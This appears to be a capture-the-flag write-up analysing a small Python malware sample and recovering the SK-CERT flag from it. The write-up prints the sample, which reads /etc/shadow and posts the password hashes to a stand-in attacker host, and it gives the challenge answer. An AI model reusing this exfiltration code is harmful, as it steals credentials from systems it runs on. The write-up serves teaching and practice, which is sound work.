# Malware Analysis CTF Writeup

## Objective
Analyze the provided malware sample and find the flag. The expected flag format is `SK-CERT{...}`.

## Step-by-Step Solution

1. **Identify the malware sample file**
   By listing the files in the repository, I noticed a Python script named `mw.py`.

2. **Analyze the source code**
   I read the contents of `mw.py`:
   ```python
   import requests
   shadow = None
   with open("/etc/shadow") as f:
       shadow = f.read()

   requests.post("attacker-address.com/shadow#SK-CERT{s70l3n_s3cr37s_g03s_70_4774ck3r}", json={"shadow": shadow})
   ```

3. **Understand the malware's behavior**
   The script performs the following actions:
   - It reads the contents of the `/etc/shadow` file, which typically contains sensitive password hashes on a Linux system.
   - It then sends this stolen data via an HTTP POST request to an external server (`attacker-address.com/shadow`).

4. **Extract the flag**
   While examining the URL used in the POST request, I found the flag appended as a URL fragment (the part after the `#`).
   The flag is explicitly written as: `SK-CERT{s70l3n_s3cr37s_g03s_70_4774ck3r}`.

## Conclusion
The malware exfiltrates sensitive system files to an attacker-controlled server. The flag was hidden in the exfiltration URL.

**Flag:** `SK-CERT{s70l3n_s3cr37s_g03s_70_4774ck3r}`
